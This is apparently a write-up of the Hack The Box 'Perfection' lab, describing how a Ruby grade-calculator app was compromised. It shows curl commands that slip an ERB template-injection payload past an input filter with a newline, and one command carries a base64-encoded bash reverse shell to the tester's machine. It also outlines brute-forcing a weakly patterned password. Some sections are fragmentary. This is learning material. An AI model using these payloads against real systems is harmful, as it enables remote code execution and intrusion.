<.> SSH Port Open
<.> HTTP Port Open

*OpenSSH 8.9p1* doesn't seem to have any obvious vulnerabilities.
I looked through Metasploit to see if there are any exploits for that version.
I found nothing usable as of my knowledge.

However, browsing the web server might give more clues.

=== Ruby Web Server

Opening ``http://10.10.11.253:80/`` returns the home page.

.Weighted Grade Calculator Home Page
image::perfection/web-home.png[]

While reading the web server, it appears that the web server were made by security students who are probably inexperienced.
So, I went and checked their web app.

.Weighted Grade Calculator Web App
image::perfection/web-calc.png[]

There were inputs.
Bingo!
One should not easily assume it's vulnerable but I can always test it.

Thus, I tried to use the web app normally.
It worked as expected.
However, the web app doesn't make a POST request if the categories are not completely filled.
The sum of the *Weight (%)* must all equal to *100%*.

.Basic Input
image::perfection/input1.png[]

Since this is a web application, the next thing I wanted to see is the *request* and *response* of the web app.
It returns a response of JSON data.

.Basic Input Log
image::perfection/result1.png[]

But it appears that the values are placed directly on the page.
Should I try doing XSS?
Will there be input sanitization?
What's the point of XSS anyway?
Okay, if not XSS, then some sort of injection can be used, right?

.Result HTML Source
image::perfection/result-html-source.png[]

But since I didn't wanna keep typing the inputs into the form, I copied the POST request as cURL command.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Your total grade is 10%<p>a: 1%</p><p>b: 2%</p><p>c: 3%</p><p>d: 3%</p><p>e: 1%</p>
----

I added some grep commands to only output what I needed.

.cURL Command
image::perfection/curl-base.png[]

The command is too long, I tried trimming it down to one category but this just results in ``Malicious input blocked``.
Something not what I want.

I tried changing one of the category values into ``<script>alert(1);</script>``.
That didn't work.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=<script>alert(1);</script>&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Malicious input blocked
----

I kept wondering why it wouldn't work.
Then I realized that web browsers tends to encode the data of the request body.
Thus, I tried doing that.

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=e&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked"

Malicious input blocked
----

But oh well, the same exact result.
Bummer.

I tried using the symbols ``( ) < > ; [ ] { }`` individually yet it still resulted the same error.

I didn't know what kind of web server I am dealing with, I wanted to know what framework is used as backend.
Turns out the answer was at the bottom of the website: ``WEBrick 1.7.0``.
This is a *Ruby HTTP server toolkit*.
Now, that's a progress.

I looked for exploits related to version *1.7.0* but the results on the web shows different versions and old as well.
I didn't know what I was doing.
I was lost.
I didn't know what to look for.
I searched and read more about attacks on web servers and I found what I needed, *Server Side Template Injection*.

=== Server Side Template Injection

Ruby got lots of templating engine but the common ones are *Embedded Ruby (ERB)* and *Slim*.
I tried my luck with ERB by testing ``<%= Dir.entries('/') %>`` (which I found https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md[here]).
Of course that didn't work as I would just get this error:

----
Invalid query parameters: invalid %-encoding (&amp;lt;%= Dir.entries(&amp;#x2F;) %&amp;gt;)
----

I forgot to encode it...
When encoded, the result is still the same.
Giving a malicious input blocked.

.Encoded SSTI
----
%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E
----

Once again, I am back on having to deal with bypassing the sanitization.
Apparently, all we have to do is add a ``%0A`` newline encoded character before the input.
But for it to work, there should be at least one valid character before it.

I didn't understand why that works.
This will be explained later on.

----
a%0A%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E <.>
----
<.> Added ``a%0A``.

And we're able to show the results!

.Working SSTI
----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0a%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked" -A 2

    </div>
----

We can now create a reverse shell!


== Exploitation

Before creating a reverse shell, I wanted to see if I can ping my host machine.

.Check connection with tcpdump 
----
$ tcpdump -i tun0 -A icmp

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
----

Then made a ping request.

.ERB Ping Request
----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0A%3C%25%3D%20system(%27ping%20-c1%2010.10.16.11%27)%20%25%3E&grade5=10&weight5=10'
----

.Output of tcpdump after a ping request
----
20:37:26.149125 IP 10.10.11.253 > 10.10.16.11: ICMP echo request, id 6, seq 1, length 64

..

..........w.tf....c....................... !"#$%&'()*+,-./01234567
----

Meaning, it's possible to connect from the web server to my machine!

I then setup netcat for reverse shell.

----
$ nc -lvnp 6969 <.>

listening on [any] 6969 ...
----
<.> Pick any port you like

I didn't like how I have to input the commands in the terminal so I made a Python script that will make a POST request to the server and make a reverse shell connection.

[,python]
----
include::attachment$perfection/perfection.py[]
----

The script is equivalent to executing

----
$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0A%3C%25%3D+system%28%22echo+%27MDwmMTk2OyBleGVjIDE5Njw%2BL2Rldi90Y3AvMTAuMTAuMTYuMTEvNjk2OTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2%27+%7C+base64+--decode+%7C+bash%22%29+%25%3E&grade5=10&weight5=10'
----

The reason I encoded the payload into base64 is so that it won't get chopped up by the input sanitization.
I don't really understand why that's needed but the payload doesn't execute without it.

.Reverse Shell Success

=== User Flag

Woops.
Here's the user flag.

----
$ cat ~/user.txt

----

=== Root Flag

I tried looking around for possible ways to gain root access.
Yep, clearly I do not know what to do.
Thus, I just went and checked the files of the user directory of ``susan``.

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
----

Ah, now that makes sense.
The database I saw earlier was the passwords for the students who probably developed the web server.
Aaaaand it's very insecure...

The password of *susan* can easily be bruteforced.
Before that, I need to identify the hashing algorithm being used.
I looked online and I found out ``hash-id`` is built-in on ParrotOS.

== Conclusion

I looked up few writeups online while doing the challenge when I got stuck.
Not really a good feeling but I needed to learn.
It is this https://medium.com/@andrewss112/hackthebox-perfection-49ab3e6ac224[writeup] that made me realize of using shell commands in a way that I should be.

Writing this writeup after about 29 days of not touching the challenge was a good way to waste my time but at the same time redo the challenge without having to look stuffs up.
I still had issues on trying to get passed the input sanitization thus I have to check if my inputs were wrong, they were the same.
I just made small mistakes like typos.

Apparently, a better way to acquire the user flag is to use the find command and by executing the cat command.
